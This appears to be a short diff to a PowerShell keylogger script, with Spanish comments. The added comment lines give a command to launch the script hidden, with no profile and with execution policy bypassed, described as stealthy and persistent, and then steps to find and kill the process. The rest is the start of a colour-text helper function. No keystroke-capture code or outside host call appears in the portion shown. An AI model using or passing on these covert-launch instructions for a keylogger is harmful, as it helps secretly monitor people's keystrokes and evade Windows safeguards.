@@ -1,5 +1,23 @@
 # Presentación colorida y visual al iniciar el keylogger
 
+# Ejecucion en Powershell en modo sigiloso y persistente:
+
+# powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File C:\Users\$env:USERNAME\Desktop\script.ps1' -WindowStyle Hidden -ErrorAction SilentlyContinue"
+
+
+# DETENCION DE SCRIPT:
+# Ejecutar en Powershell:
+
+# Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*script.ps1*' } | Select-Object ProcessId, CommandLine
+
+# (Veremos un numero ed proceso asociado Ej 1234 )
+
+# Para detenerlo:
+# Stop-Process -Id 1234 -Force
+
+# (Detenemos el proceso)
+
+
 # Función para escribir texto con colores y efectos
 function Write-Color {
     param (
